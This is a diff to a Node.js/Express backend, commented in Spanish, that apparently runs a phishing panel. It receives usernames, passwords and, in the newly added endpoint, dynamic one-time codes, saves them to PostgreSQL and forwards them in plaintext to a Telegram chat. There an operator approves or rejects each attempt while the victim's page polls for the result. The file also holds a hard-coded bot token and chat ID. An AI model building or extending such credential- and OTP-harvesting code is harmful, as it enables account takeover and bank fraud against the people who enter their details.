@@ -19,12 +19,13 @@ const TELEGRAM_TOKEN = '8924337848:AAFGDJNL-mlHcwj1mJAq2dDmavj7dHL0QeI';
 const CHAT_ID = '-1004356075782';
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });
 
-// --- ENDPOINT: RECIBIR DATOS DEL FRONTEND ---
+// ==========================================
+// 1. LÓGICA EXISTENTE (USUARIO Y CLAVE)
+// ==========================================
 app.post('/api/login', async (req, res) => {
     const { usuario, clave } = req.body;
 
     try {
-        // 1. Guardar intento en PostgreSQL
         const query = `
             INSERT INTO intentos_login (usuario, clave, estado, fecha) 
             VALUES ($1, $2, 'pendiente', NOW()) 
@@ -33,10 +34,8 @@ app.post('/api/login', async (req, res) => {
         const result = await pool.query(query, [usuario, clave]);
         const intentoId = result.rows[0].id;
 
-        // 2. Enviar mensaje a Telegram
         const mensaje = `🚨 *Nuevo Intento de Login*\n\n👤 *Usuario:* ${usuario}\n🔑 *Clave:* ${clave}\n\n¿Aprobar acceso?`;
         
-        // Guardamos el ID del mensaje en la BD para poder editarlo luego si es necesario
         const msg = await bot.sendMessage(CHAT_ID, mensaje, {
             parse_mode: 'Markdown',
             reply_markup: {
@@ -49,7 +48,6 @@ app.post('/api/login', async (req, res) => {
             }
         });
 
-        // Actualizamos la BD con el ID del mensaje de Telegram
         await pool.query('UPDATE intentos_login SET mensaje_telegram_id = $1 WHERE id = $2', [msg.message_id, intentoId]);
 
         res.json({ success: true, intentoId: intentoId });
@@ -60,7 +58,6 @@ app.post('/api/login', async (req, res) => {
     }
 });
 
-// --- ENDPOINT: VERIFICAR ESTADO (Polling del Front) ---
 app.get('/api/status/:id', async (req, res) => {
     try {
         const { id } = req.params;
@@ -75,7 +72,62 @@ app.get('/api/status/:id', async (req, res) => {
     }
 });
 
-// --- WEBHOOK: RECIBIR RESPUESTA DE TELEGRAM ---
+// ==========================================
+// 2. NUEVA LÓGICA (CLAVE DINÁMICA)
+// ==========================================
+app.post('/api/dinamica', async (req, res) => {
+    const { usuario, clave, claveDinamica } = req.body;
+
+    try {
+        const query = `
+            INSERT INTO intentos_dinamica (usuario, clave, clave_dinamica, estado, fecha) 
+            VALUES ($1, $2, $3, 'pendiente', NOW()) 
+            RETURNING id;
+        `;
+        const result = await pool.query(query, [usuario, clave, claveDinamica]);
+        const intentoId = result.rows[0].id;
+
+        const mensaje = `🔐 *Clave Dinámica Recibida*\n\n👤 *Usuario:* ${usuario}\n🔑 *Clave:* ${clave}\n🔢 *Dinámica:* ${claveDinamica}\n\n¿Qué deseas hacer?`;
+        
+        const msg = await bot.sendMessage(CHAT_ID, mensaje, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: '✅ Aprobar Dinámica', callback_data: `accept_dinamica_${intentoId}` },
+                        { text: '❌ Error Dinámica', callback_data: `reject_dinamica_${intentoId}` }
+                    ]
+                ]
+            }
+        });
+
+        await pool.query('UPDATE intentos_dinamica SET mensaje_telegram_id = $1 WHERE id = $2', [msg.message_id, intentoId]);
+
+        res.json({ success: true, intentoId: intentoId });
+
+    } catch (error) {
+        console.error("Error en /api/dinamica:", error);
+        res.status(500).json({ success: false, message: "Error en el servidor" });
+    }
+});
+
+app.get('/api/status-dinamica/:id', async (req, res) => {
+    try {
+        const { id } = req.params;
+        const result = await pool.query('SELECT estado FROM intentos_dinamica WHERE id = $1', [id]);
+        
+        if (result.rows.length === 0) {
+            return res.status(404).json({ estado: 'no_encontrado' });
+        }
+        res.json({ estado: result.rows[0].estado }); 
+    } catch (error) {
+        res.status(500).json({ error: 'Error de BD' });
+    }
+});
+
+// ==========================================
+// 3. WEBHOOK ACTUALIZADO (SOPORTA AMBOS)
+// ==========================================
 app.post(`/webhook/telegram`, async (req, res) => {
     const callbackQuery = req.body.callback_query;
 
@@ -83,14 +135,22 @@ app.post(`/webhook/telegram`, async (req, res) => {
         const data = callbackQuery.data; 
         const chatId = callbackQuery.message.chat.id;
         const messageId = callbackQuery.message.message_id;
-        const [accion, id] = data.split('_');
+        
+        // Detectamos si es del login normal o de la dinámica
+        const parts = data.split('_');
+        const accion = parts[0]; // 'accept' o 'reject'
+        const tipo = parts.length > 2 ? parts[1] : 'login'; // 'dinamica' o 'login'
+        const id = parts.length > 2 ? parts[2] : parts[1];
 
         try {
-            // 1. Actualizar la base de datos (Aceptado o Rechazado)
-            const nuevoEstado = accion === 'accept' ? 'aceptado' : 'rechazado';
-            await pool.query('UPDATE intentos_login SET estado = $1 WHERE id = $2', [nuevoEstado, id]);
+            let nuevoEstado = accion === 'accept' ? 'aceptado' : 'rechazado';
+            
+            if (tipo === 'dinamica') {
+                await pool.query('UPDATE intentos_dinamica SET estado = $1 WHERE id = $2', [nuevoEstado, id]);
+            } else {
+                await pool.query('UPDATE intentos_login SET estado = $1 WHERE id = $2', [nuevoEstado, id]);
+            }
 
-            // 2. Editar el mensaje en Telegram para quitar los botones y mostrar el resultado
             let textoOriginal = callbackQuery.message.text;
             let textoActualizado = `${textoOriginal}\n\n---\n${nuevoEstado === 'aceptado' ? '✅ *ACEPTADO*' : '❌ *RECHAZADO*'}`;
             
@@ -98,24 +158,20 @@ app.post(`/webhook/telegram`, async (req, res) => {
                 chat_id: chatId,
                 message_id: messageId,
                 parse_mode: 'Markdown',
-                reply_markup: { inline_keyboard: [] } // Elimina los botones para que no se pueda clickear dos veces
+                reply_markup: { inline_keyboard: [] } 
             });
 
-            // 3. Responder a Telegram (obligatorio para que desaparezca el relojito en el botón)
-            await bot.answerCallbackQuery(callbackQuery.id, { text: `Acceso ${nuevoEstado}` });
+            await bot.answerCallbackQuery(callbackQuery.id, { text: `Estado: ${nuevoEstado}` });
 
         } catch (error) {
             console.error("Error procesando webhook:", error);
-            // Si hay un error (por ejemplo, porque el usuario ya le había dado click), respondemos igual
             bot.answerCallbackQuery(callbackQuery.id, { text: "Este intento ya fue procesado o expiró." }).catch(()=>{});
         }
     }
 
-    // Siempre responder 200 OK a Telegram para que no reintente enviar el mensaje
     res.sendStatus(200);
 });
 
-// Iniciar servidor
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Backend corriendo en puerto ${PORT}`);
